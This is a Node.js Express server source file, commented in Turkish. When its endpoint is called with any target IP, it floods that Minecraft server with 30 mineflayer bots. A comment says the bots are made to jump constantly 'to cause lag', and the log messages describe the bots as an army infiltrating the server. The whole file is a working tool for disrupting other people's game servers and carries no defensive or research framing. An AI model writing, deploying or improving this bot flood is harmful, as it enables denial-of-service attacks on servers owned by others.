const express = require('express');
const mineflayer = require('mineflayer');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 10000;

app.use(cors());

let bots = [];

app.get('/bot-gonder', (req, res) => {
    const { ip, isim } = req.query;
    const botSayisi = 30; // Hedef: 30 Bot

    console.log(`[ORDU BAŞLATILDI] ${botSayisi} bot ${ip} adresine sızıyor...`);

    for (let i = 1; i <= botSayisi; i++) {
        setTimeout(() => {
            const botName = `${isim}_${i}`;
            
            const bot = mineflayer.createBot({
                host: ip,
                port: 25565,
                username: botName,
                version: "1.20.1", // Sunucu sürümüne göre değiştir
                hideErrors: true
            });

            bot.on('spawn', () => {
                console.log(`[+] ${botName} içeri girdi.`);
                // Bot içeri girince zıplasın (Lag yapması için)
                setInterval(() => { if(bot.entity) bot.setControlState('jump', true); }, 500);
            });

            bot.on('kicked', (reason) => console.log(`[-] ${botName} atıldı: ${reason}`));
            bot.on('error', (err) => {});

            bots.push(bot);
        }, i * 200); // RAM patlamasın diye her botu 200ms arayla sokar
    }

    res.send(`${botSayisi} adet bot sevk edildi!`);
});

// Botları toplu çıkarma komutu
app.get('/bot-cikar', (req, res) => {
    bots.forEach(b => b.quit());
    bots = [];
    res.send("Tüm ordu geri çekildi.");
});

app.get('/bot-zipla', (req, res) => res.send("OK"));
app.listen(port, '0.0.0.0');
